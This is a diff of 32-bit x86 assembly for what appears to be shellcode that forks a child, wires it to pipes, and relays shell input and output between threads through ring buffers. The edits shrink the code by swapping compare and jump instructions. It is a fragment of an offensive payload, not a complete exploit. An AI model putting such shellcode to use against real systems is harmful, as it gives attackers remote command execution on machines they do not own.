@@ -97,8 +97,8 @@ shcode_start:
 	add	ebx,m2sh_0
 	int	0x80
 
-	cmp	eax,0
-	jne	child_dead_interleaved
+	test	eax,eax
+	jnz	child_dead_interleaved
 
 	; pipe(sh2m)
 	xor	eax,eax
@@ -107,17 +107,17 @@ shcode_start:
 	add	ebx,sh2m_0
 	int	0x80
 
-	cmp	eax,0
-	jne	child_dead_interleaved
+	test	eax,eax
+	jnz	child_dead_interleaved
 
 	; fork()
 	xor	eax,eax
 	mov	al,2
 	int	0x80
 
-	cmp	eax,0
-	je	child
-	jg	parent			; signed compare
+	test	eax,eax
+	jz	child
+	jns	parent			; signed > 0 ?
 child_dead_interleaved:
 	jmp	child_dead
 
@@ -133,7 +133,8 @@ child:
 	jne	leave_sh_interleaved
 
 	; dup2(sh2m[1], 1)   (dup to stdout)
-	xor	eax,eax
+	; for sure: EAX is 0.
+	;xor	eax,eax
 	mov	al,63
 	mov	ebx,[ebp+sh2m_1]
 	inc	ecx
@@ -204,11 +205,11 @@ parent:
 	xor	edx,edx
 	int	0x80
 
-	cmp	eax,0
+	test	eax,eax
 	; ret=0 -> clone
-	je	thread_write_to_master_interleaved	; clone is writer
-	; ret>0 -> original
-	jg	thread_read_from_master			; original is reader
+	jz	thread_write_to_master_interleaved	; clone is writer
+	; ret>0 (signed) -> original
+	jns	thread_read_from_master			; original is reader
 	; error if ret<0
 	jmp	child_dead
 
@@ -231,15 +232,15 @@ reader_while_fds_ok:
 
 	; test, if master requested child to be terminated
 	mov	al,[ebp+terminate_child]
-	cmp	al,0
-	jne	do_terminate_child
+	test	al,al
+	jnz	do_terminate_child
 
 	; if ringbuffer is EMPTY ( _reader == _writer ), do nothing.
 	xor	eax,eax
 	mov	al,[ebp+rfrm_writer_pos]
 	sub	al,[ebp+rfrm_reader_pos]
-	cmp	al,0
-	je	reader_sleep
+	test	al,al
+	jz	reader_sleep
 
 	; EAX/AL is the number of bytes to be written to the child.
 
@@ -254,10 +255,9 @@ reader_while_fds_ok:
 	inc	edx			; EDX := 1
 	int	0x80
 
-	xor	ebx,ebx
-	inc	ebx
-	cmp	eax,ebx
-	je	reader_write_to_child_ok
+	; we wrote 1 byte, thus syscall should return 1 in EAX.
+	dec	eax
+	jz	reader_write_to_child_ok
 
 	mov byte [ebp+to_child_ok], 0
 	jmp	reader_while_fds_ok
@@ -326,10 +326,9 @@ writer_while_fds_ok:
 	inc	edx
 	int	0x80
 
-	xor	ebx,ebx
-	inc	ebx
-	cmp	eax,ebx
-	je	writer_read_from_child_ok
+	; we read one byte. syscall should return 1 in EAX.
+	dec	eax
+	jz	writer_read_from_child_ok
 
 	mov byte [ebp+from_child_ok],0
 	jmp	writer_while_fds_ok
